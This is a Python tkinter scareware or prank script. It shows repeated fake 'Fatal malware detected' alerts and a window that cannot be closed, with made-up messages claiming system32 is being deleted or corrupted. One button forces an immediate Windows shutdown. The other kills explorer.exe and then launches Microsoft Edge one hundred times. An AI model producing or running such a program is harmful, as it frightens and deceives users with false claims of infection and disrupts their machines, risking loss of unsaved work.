#Importing modules
import os
from tkinter import *
from PIL import ImageTk, Image
#========================================

#warning windows
w = Tk()
w.geometry('400x185')
w.title('error!')
w.iconbitmap('error.ico')
w.resizable(False, False)
w.configure(bg='black')
path = "error.ico"
img = ImageTk.PhotoImage(Image.open(path))

lb = Label(w, text= 'Fatal malware detected! Take actions immediately     ', font=("System", 8))
lb.configure(bg='black', foreground='white')
lb.pack(side= RIGHT, anchor="e")

imglb = Label(w, image = img, bg='black')
imglb.pack(side= LEFT, anchor="w")

w.mainloop()

w = Tk()
w.geometry('400x185')
w.title('error!')
w.iconbitmap('error.ico')
w.resizable(False, False)
w.configure(bg='black')
path = "error.ico"
img = ImageTk.PhotoImage(Image.open(path))

lb = Label(w, text= 'Fatal malware detected! Take actions immediately     ', font=("System", 8))
lb.configure(bg='black', foreground='white')
lb.pack(side= RIGHT, anchor="e")

imglb = Label(w, image = img, bg='black')
imglb.pack(side= LEFT, anchor="w")

w.mainloop()

w = Tk()
w.geometry('400x185')
w.title('error!')
w.iconbitmap('error.ico')
w.resizable(False, False)
w.configure(bg='black')
path = "error.ico"
img = ImageTk.PhotoImage(Image.open(path))

lb = Label(w, text= 'Fatal malware detected! Take actions immediately     ', font=("System", 8))
lb.configure(bg='black', foreground='white')
lb.pack(side= RIGHT, anchor="e")

imglb = Label(w, image = img, bg='black')
imglb.pack(side= LEFT, anchor="w")

w.mainloop()

#============================================================================

#Yes No window
w = Tk()
w.title('last warning!')
w.iconbitmap('error.ico')
w.resizable(False, False)
w.configure(bg='black')
w.geometry('400x185')
#===========================================

#Can close window event

def disable_event():
    pass
#============================================

lb = Label(w, text= 'Do you still want to use this computer?', font=("Terminal", 11))
lb.configure(bg='black', foreground='white')
lb.place(x=50, y=10)

#No function
def no():
     for widget in w.winfo_children():
         widget.destroy()
     w.geometry('400x185')
     w.title('error!')
     w.iconbitmap('error.ico')
     w.resizable(False, False)
     w.configure(bg='black')

     lb = Label(w, text= 'deleting system32...')
     lb.configure(bg='black', foreground='white')
     lb.pack()
     lb = Label(w, text= 'extracting files...')
     lb.configure(bg='black', foreground='white')
     lb.pack()
     lb = Label(w, text= 'running virus.sys')
     lb.configure(bg='black', foreground='white')
     lb.pack()
     lb = Label(w, text= 'process finished sucsessfully ✅')
     lb.configure(bg='black', foreground='white')
     lb.pack()

     btn = Button(w, text= 'Finish', command= finish, font=("Terminal", 11))
     btn.pack()

#===============================================================================
     
#Shutdown function
def finish():
    os.system("shutdown /s /t 1")
    w.destroy()
#=================================================================

#Yes function         
def yes():
    for widget in w.winfo_children():
        widget.destroy()
    w.geometry('400x185')
    w.title('error!')
    w.iconbitmap('error.ico')
    w.resizable(False, False)
    w.configure(bg='black')

    lb0 = Label(w, text= 'Hijacking files.....')
    lb0.configure(bg='black', foreground='white', font=("Terminal", 11))
    lb0.pack()

    lb1 = Label(w, text= 'Corrupting system32...')
    lb1.configure(bg='black', foreground='white', font=("Terminal", 11))
    lb1.pack()

    l = Label(w, text= 'viruz.sys activated, system32 corrupted✅')
    l.configure(bg='black', foreground='white', font=("Terminal", 11))
    l.pack()


    lb = Label(w, text= 'Proceeding to shutdown.....')
    lb.configure(bg='black', foreground='white', font=("Terminal", 11))
    lb.pack()

    lb = Label(w, text= 'Signing out....')
    lb.configure(bg='black', foreground='white', font=("Terminal", 11))
    lb.pack()

    lb = Label(w, text= 'Processs completed ✅')
    lb.configure(bg='black', foreground='white', font=("Terminal", 11))
    lb.pack()

    btn3 = Button(w, text= 'QUIT NOW', command= kill, font=("Terminal", 11))
    btn3.pack()

btn = Button(w, text= 'Yes', command=yes, font=("Terminal", 11))
btn.place(x=185, y=60)

btn2 = Button(w, text= 'No', command=no, font=("Terminal", 11))
btn2.place(x=187, y=100)

#=====================================================================================

#Kill task function
def kill():
    os.system("taskkill /f /im  explorer.exe")
    w.destroy()

    num = 100
    for _ in range(num):
        os.startfile("C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
#=====================================================

#window mainloop
w.protocol("WM_DELETE_WINDOW", disable_event)
w.mainloop()
#=======================================================
